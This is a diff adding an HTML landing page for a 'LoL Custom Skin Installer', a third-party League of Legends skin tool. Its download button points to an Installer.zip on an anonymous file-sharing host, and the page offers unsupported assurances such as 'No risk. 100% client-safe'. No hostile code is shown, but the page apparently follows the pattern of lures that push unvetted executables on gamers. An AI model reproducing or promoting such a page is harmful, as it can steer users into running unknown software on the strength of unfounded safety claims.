@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>LoL Custom Skin Installer</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #0f0f14;
+      color: #fff;
+    }
+
+    header {
+      background: linear-gradient(to right, #3a0ca3, #7209b7);
+      padding: 20px;
+      text-align: center;
+      font-size: 2em;
+      font-weight: bold;
+    }
+
+    .slideshow {
+      position: relative;
+      width: 100vw;
+      height: 400px;
+      overflow: hidden;
+      background-color: #000;
+    }
+
+    .slides {
+      display: flex;
+      width: 300vw;
+      animation: slide 30s linear infinite;
+    }
+
+    .slide {
+      width: 100vw;
+      flex-shrink: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .slide img {
+      max-width: 100%;
+      max-height: 100%;
+      object-fit: contain;
+    }
+
+    @keyframes slide {
+      0%   { transform: translateX(0); }
+      10%  { transform: translateX(0); }
+      30%  { transform: translateX(-100vw); }
+      40%  { transform: translateX(-100vw); }
+      60%  { transform: translateX(-200vw); }
+      70%  { transform: translateX(-200vw); }
+      100% { transform: translateX(0); }
+    }
+
+    .content {
+      text-align: center;
+      padding: 40px 20px;
+    }
+
+    .download-btn {
+      display: inline-block;
+      padding: 15px 30px;
+      background-color: #7209b7;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 1.2em;
+      text-decoration: none;
+      transition: background-color 0.3s ease;
+    }
+
+    .download-btn:hover {
+      background-color: #560bad;
+    }
+
+    .section {
+      margin: 50px auto;
+      max-width: 800px;
+      padding: 0 20px;
+    }
+
+    h2 {
+      color: #ffb703;
+    }
+
+    ul {
+      text-align: left;
+      display: inline-block;
+      margin-top: 10px;
+    }
+
+    .beta {
+      background-color: #27263d;
+      border-left: 4px solid #ffb703;
+      padding: 20px;
+      border-radius: 10px;
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  LoL Custom Skin Installer
+</header>
+
+<!-- SLIDESHOW -->
+<div class="slideshow">
+  <div class="slides">
+    <div class="slide"><img src="1.png" alt="Skin 1"></div>
+    <div class="slide"><img src="2.png" alt="Skin 2"></div>
+    <div class="slide"><img src="3.png" alt="Skin 3"></div>
+  </div>
+</div>
+
+<!-- CONTENT -->
+<div class="content">
+  <h2>Customize Your League Experience</h2>
+  <p>Easily install beautiful custom skins for your favorite champions with our simple and safe tool.</p>
+  <a class="download-btn" href="https://d1534.download-send.com/d/oryxl2zh6cosj4l4pvtvnh5qyak6ffrvfgicw7p6pci2ztu66sxaehwycuah2h3ogn4nl5aq/Installer.zip" download>Download Now</a>
+</div>
+
+<!-- SYSTEM REQUIREMENTS -->
+<div class="section">
+  <h2>💻 System Requirements</h2>
+  <ul>
+    <li>Operating System: Windows 7 / 10 / 11</li>
+    <li>RAM: 2GB or higher</li>
+    <li>Disk Space: 100MB</li>
+    <li>League of Legends: Official Client (any region)</li>
+  </ul>
+  <p><strong>No FPS loss. No risk. 100% client-safe.</strong></p>
+</div>
+
+<!-- PERFORMANCE -->
+<div class="section">
+  <h2>🚀 Performance</h2>
+  <p>Our tool runs completely outside of League of Legends' core files, meaning <strong>zero impact on performance</strong>. It’s lightweight, fast, and built with gamers in mind.</p>
+</div>
+
+<!-- BETA NOTICE -->
+<div class="section beta">
+  <h2>🧪 We Are in Beta!</h2>
+  <p>We’re actively testing features and looking for players to try the app and give feedback. Be a part of shaping the future of LoL skin customization!</p>
+  <p><strong>Interested in being a tester? Contact us through the Discord server (coming soon!)</strong></p>
+</div>
+
+</body>
+</html>
